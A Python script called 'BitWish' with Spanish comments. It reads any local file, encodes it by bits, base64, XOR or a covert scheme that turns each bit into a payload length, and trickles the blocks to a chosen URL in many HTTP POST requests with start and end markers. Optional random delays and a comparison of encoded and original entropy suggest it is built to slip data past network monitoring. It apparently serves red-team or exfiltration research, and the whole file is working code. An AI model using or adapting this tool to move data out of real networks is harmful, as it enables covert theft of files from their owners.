import requests
import time
import random
import hashlib
import math
import sys
import base64
import argparse

# Obtener fichero
def getFileByPath(path):
    # Abre fichero y obtiene contenido
    with open(path, 'rb') as f:
        contentToSend = f.read()
    #contentToSend = 'Hola ¿Qué tal estás?'.encode('utf-8')
    return contentToSend

# Añade palabra de control al final
def addEndedWord(data):
    endedWord = b"ENDED010203"
    data = data + endedWord
    return data

# Dividir mensaje en bloques
def cutIntoBlocks(blockSize, data):
    blocks = []
    # Dividir el mensaje en bloques
    for index in range(0, len(data), blockSize):
        payload = '|'.join(element for element in data[index:index + blockSize])
        blocks.append(payload)

    return blocks 

def getEntropy(data):

    # Convertimos lista en cadena
    if type(data) == list: data = ''.join(element for element in data)

    # Contar la frecuencia de cada carácter
    frequencies = {}
    for char in data: frequencies[char] = frequencies.get(char, 0) + 1
    
    # Calcular la probabilidad de cada carácter
    lengthData = len(data)
    probabilities = [frequency / lengthData for frequency in frequencies.values()]
    
    # Calcular la entropía: H = -Σ p(x) * log2(p(x))
    entropy = 0
    for probability in probabilities:
        entropy -= probability * math.log2(probability)

    return entropy

# Coficación de los datos
def encodeData(data, encodingMethod, key):
    dataToSend = []

    # Convertir byte en bits
    if encodingMethod == "ByteToBits":
        # Transforma el mensaje en bits.
        for b in data:
            byte = ''.join(f'{b:08b}')
            dataToSend.append(byte)

    # Convertir byte a bit y bit a representación bit por tamaño cadena
    elif encodingMethod == "ByteToBitToPayloadSize":
        # Transforma el mensaje en bits.
        for b in data:
            bits = ''.join(f'{b:08b}')
            # Permuta cada bit por tamaño
            for bit in bits:
                if bit == '0': size = 1 # Tamaño 1 para bit 0
                else:          size = 2 # Tamaño 2 para bit 1
                # Creación del payload a enviar en la petición POST
                bitAsSize = 'a' * size
                # Añade al iterador de payloads
                dataToSend.append(bitAsSize)

    # Convertir byte en base64
    elif encodingMethod == "ByteToBase64":
        for b in data:
            # Transforma cada caracter a base64.
            byte = base64.b64encode(bytes([b])).decode('utf-8')
            dataToSend.append(byte)

    # Convertir byte en xor:
    elif encodingMethod == "ByteToXor":
        key = key.encode()
        for index, b in enumerate(data):
            xor = b ^ key[index % len(key)]
            xor = str(xor)
            dataToSend.append(xor)

    else:
        dataToSend.append(data)

    return dataToSend

def getHashData(data):
    _hash = hashlib.new('sha256')
    _hash.update(data)
    print(f'\n[+] Hash: {_hash.hexdigest()}')


def menu():

    encoders = ['ByteToBits', 'ByteToBase64', 'ByteToBitToPayloadSize', 'ByteToXor']
    key      = None

    parser = argparse.ArgumentParser(description="BitWish")
    parser.add_argument('--pathFile',       type=str, required=True, help='Ruta del archivo')
    parser.add_argument('--url',            type=str, required=True, help='URL de destino')
    parser.add_argument('--blockSize',      type=int, required=True, help='Tamaño del bloque')
    parser.add_argument('--encodingMethod', type=str, required=True, choices=encoders, help='Método de codificación')
    parser.add_argument('--key',            type=str, help='Clave para encodingMethod ByteToXor')
    parser.add_argument('--delay',          action='store_true', help='Tiempo aleatorio de ejecución')
    args = parser.parse_args()

    # Si encodingMethod necesita clave, --key debe estar presente
    if args.encodingMethod == 'ByteToXor' and not args.key:
        print("[-] El método ByteToXor requiere que proporciones una clave con --key.")
        sys.exit(1)
    elif args.encodingMethod in ['ByteToXor'] and args.key:
        key = args.key

    pathFile       = args.pathFile
    url            = args.url
    blockSize      = args.blockSize
    encodingMethod = args.encodingMethod
    delay          = args.delay

    return pathFile, url, blockSize, encodingMethod, key, delay


def main(pathFile, url, blockSize, encodingMethod, key, delay):

    print(f"\n[+] Nombre fichero:                               {pathFile}")
    print(f"[+] URL:                                          {url}")
    print(f"[+] Tamaño bloque:                                {blockSize}")
    print(f"[+] Método codificación:                          {encodingMethod}")
    print(f"[+] Tiempo aleatorio entre peticiones:            {delay}")
    if key: print(f"[+] Clave codificación:                   {key}")

    # Obtiene contenido del fichero
    originalContent = getFileByPath(path=pathFile)
    # Codifica los datos a enviar
    encodedContent  = encodeData(data=originalContent, encodingMethod=encodingMethod, key=key)

    # Calcula la entropía
    originalContentEntropy = getEntropy(data=originalContent)
    encodedContentEntropy  = getEntropy(data=encodedContent)

    # Fragmenta los datos a enviar
    if len(encodedContent) < blockSize: blockSize = len(encodedContent)
    blocksToSend = cutIntoBlocks(blockSize=blockSize, data=encodedContent)

    # Obtiene el número del contenido origianl
    totalBytesOriginalData    = len(originalContent)
    # Obtiene el número de bytes codificados a enviar
    totalBytesDataEncoded     = sum(len(element) for element in encodedContent)
    # Total de paquetes con fragmentación
    totalPacketsWithoutBlocks = len(encodedContent)
    # Total de paquetes con fragmentación
    totalPacketWithBlocks     = len(blocksToSend)

    # Total de bytes a enviar
    print(f"[+] Total bytes fichero original:                 {totalBytesOriginalData}")
    print(f"[+] Total bytes fichero codificado:               {totalBytesDataEncoded}")
    print(f"[+] Aumento datos tras codificación:              {round(totalBytesDataEncoded/totalBytesOriginalData, 1)}X")
    # Fragmentación
    print(f"\n[+] Tamaño de fragmentación:                      {blockSize}")
    print(f"[+] Número total de peticiones sin fragmentación: {totalPacketsWithoutBlocks}")
    print(f"[+] Número total de peticiones con fragmentación: {totalPacketWithBlocks}")
    # Entropía
    print(f"\n[+] Entropía contenido original:                  {originalContentEntropy}")
    print(f"[+] Entropía contenido codificado:                {encodedContentEntropy}")


    # Imprime hash datos originales a enviar
    getHashData(data=originalContent)

    # Define variables control envío
    currentBytesSended      = 0
    numberPacketsSended     = 0
    packetLengthBeforePrint = 0

    # Obtiene hora inicio ejecución para medir tasa transferencia
    startTime = lastTime = time.time()

    # Envía palabra fin transmisión
    response = requests.post(url, data=b"START010203")
    # Envía palabra fin transmisión
    response = requests.post(url, data=encodingMethod)

    print("\n[+] Transfiriendo datos ...")

    # Itera cada bloque para transformalo y enviarlo
    for payload in blocksToSend:

        # Variables para tasa de transferencia
        currentBytesSended  += len(payload)
        numberPacketsSended += 1

        response = requests.post(url, data=payload)

        showTransferRateEach = 10
        if numberPacketsSended % showTransferRateEach == 0 or numberPacketsSended == totalPacketWithBlocks:
            ##
            # Cada n paquetes hace control de transferencia (debug)
            ##
            partialTime  = time.time()
            duration     = partialTime - startTime
            transferRate = int(currentBytesSended / duration) if duration > 0 else 1
            leftTime     = ((totalPacketWithBlocks - numberPacketsSended) / transferRate) / 60 / 60
            if   len(str(transferRate)) > 7:  transferRate = f'{transferRate / 1024:.0f} MB/s'
            elif len(str(transferRate)) > 3:  transferRate = f'{transferRate / 1024:.0f} KB/s'
            elif len(str(transferRate)) <= 3: transferRate = f'{transferRate:.0f} B/s'
            print(f'\n\tPaquete enviado:          {numberPacketsSended} / {totalPacketWithBlocks}')
            print(f'\tPaquetes por enviar:      {totalPacketWithBlocks - numberPacketsSended}')
            print(f'\tTiempo:                   {duration:.0f} segundos')
            print(f'\tTiempo restante:          {leftTime:.4f} horas')
            print(f'\tTasa de transferencia:    {transferRate}')
            if numberPacketsSended != totalPacketWithBlocks:
                print("\033[F" * 6, end='')
            currentBytesSended = 0
        # Establece rango de tiempo aleatorio para el envío de cada bit.

        if delay:
            seconds = random.uniform(0.01, 0.05)
            time.sleep(seconds)

    # Envía palabra fin transmisión
    response = requests.post(url, data=b"END010203")

    # Imprime control de transferencia final
    endedTime    = time.time()
    duration     = endedTime - startTime
    transferRate = int(totalBytesDataEncoded / duration) if duration > 0 else 0

    if   len(str(transferRate)) > 6:  transferRate = f'{transferRate / 1024 / 1024:.0f} MB/s'
    elif len(str(transferRate)) > 3:  transferRate = f'{transferRate / 1024:.0f} KB/s'
    elif len(str(transferRate)) <= 3: transferRate = f'{transferRate:.0f} B/s'

    print("\n[+] Resumen transferencia:")
    print(f'\n\tTamaño total:             {totalBytesOriginalData} bytes')
    print(f'\tTamaño total enviado:     {totalBytesDataEncoded} bytes')
    print(f'\tTiempo total:             {duration:.6f} segundos')
    print(f'\tTasa de transferencia:    {transferRate}')
    print("\n")


if __name__ == "__main__":
    pathFile, url, blockSize, encodingMethod, key, delay = menu()
    main(pathFile, url, blockSize, encodingMethod, key, delay)